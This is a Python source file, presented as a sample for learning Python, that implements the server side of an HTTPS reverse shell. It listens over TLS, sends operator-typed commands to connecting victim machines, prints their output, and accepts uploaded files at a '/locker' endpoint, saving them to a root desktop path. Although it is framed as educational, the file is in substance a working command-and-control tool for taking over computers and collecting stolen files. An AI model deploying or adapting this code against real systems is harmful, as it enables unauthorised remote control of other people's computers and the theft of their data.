#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""

Sample HTTPS reverse shell client example to learn Python language

MIT License
Copyright (c) 2019, Diogo G. Soares

Permission is hereby granted, free of charge, to any person
obtaining a copy of this software and associated documentation
files (the "Software"), to deal in the Software without
restriction, including without limitation the rights to use,
copy, modify, merge, publish, distribute, sublicense, and/or
sell copies of the Software, and to permit persons to whom the
Software is furnished to do so, subject to the following
conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.
"""

import argparse
import ssl
import time
import cgi
from http.server import HTTPServer, BaseHTTPRequestHandler

__author__ = "dggsoares"
__copyright__ = "Copyright (c) 2019, Diogo G. Soares"
__description__ = 'Simple HTTPS reverse shell server example to learn Python language'
__license__ = "MIT"
__version__ = "1.0"
__maintainer__ = "Diogo G. Soares"
__email__ = "dggsoares at gmail"
__status__ = "Development"
__date__ = 20190411

HOST_NAME = '0.0.0.0'
PORT = 4433


class Server(BaseHTTPRequestHandler):

    def do_GET(self):
        command = input(f"[#] Shell {self.client_address[0]} > ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        if self.path == '/locker':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile,
                                          headers=self.headers,
                                          environ={'REQUEST_METHOD': 'POST'}
                                          )
                else:
                    print("[X] Unexpected POST request")

                fs_upload = fs['file']

                with open('/root/Desktop/1.txt', 'wb') as o:
                    o.write(fs_upload.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)

            return

        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        command_output = self.rfile.read(length)
        print(command_output.decode())


def main(args):
    httpd = HTTPServer((args.bind, args.port), Server)
    httpd.socket = ssl.wrap_socket(httpd.socket, certfile=args.cert, keyfile=args.key)

    try:
        print(f'[+] {time.asctime()} Server is RUNNING! - {args.bind}:{args.port}')
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.server_close()
        print(f'[x] {time.asctime()} Server is DOWN! - {args.bind}:{args.port}')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=__description__,
                                     epilog=f'Built by {__author__}. Version {__date__}',
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter
                                     )
    parser.add_argument('-b', '--bind', help='IP for bind server', required=True, default='0.0.0.0')
    parser.add_argument('-p', '--port', help='Port for bind service', default=443)
    parser.add_argument('-c', '--cert', help='Certicate X.509 file', default='cert.pem')
    parser.add_argument('-k', '--key', help='Key for certificate file', default='key.pem')

    args = parser.parse_args()
    main(args)
